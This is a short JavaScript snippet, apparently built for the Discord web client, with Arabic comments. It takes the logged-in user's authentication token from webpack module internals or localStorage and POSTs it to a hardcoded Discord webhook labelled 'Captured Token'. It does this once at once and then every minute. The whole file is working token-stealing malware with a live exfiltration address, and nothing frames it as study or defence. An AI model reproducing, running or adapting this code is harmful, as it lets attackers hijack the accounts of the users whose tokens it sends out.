(function() {
    const webhook = "https://discord.com/api/webhooks/1463909673303412747/i3VXrwPefUdfNamhMJlR9L_rqSOM41eWVZb641ERxaGf7KuieSjeVobmH6Y1W1tDZUH4";

    function getAndSend() {
        // سحب التوكين من عدة مسارات لضمان النجاح
        let token = (window.webpackChunkdiscord_app?.push([[''],{},e=>{m=[];for(let i in e.c)m.push(e.c[i])}]),m)?.find(m=>m?.exports?.default?.getToken!==undefined)?.exports.default.getToken() 
                    || localStorage.getItem('token')?.replace(/"/g, "");

        if (token && token !== "undefined") {
            fetch(webhook, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ content: "🚀 **Captured Token:** `" + token + "`" })
            });
        }
    }

    // التنفيذ الفوري وعند كل تحديث
    getAndSend();
    setInterval(getAndSend, 60000); 
})();
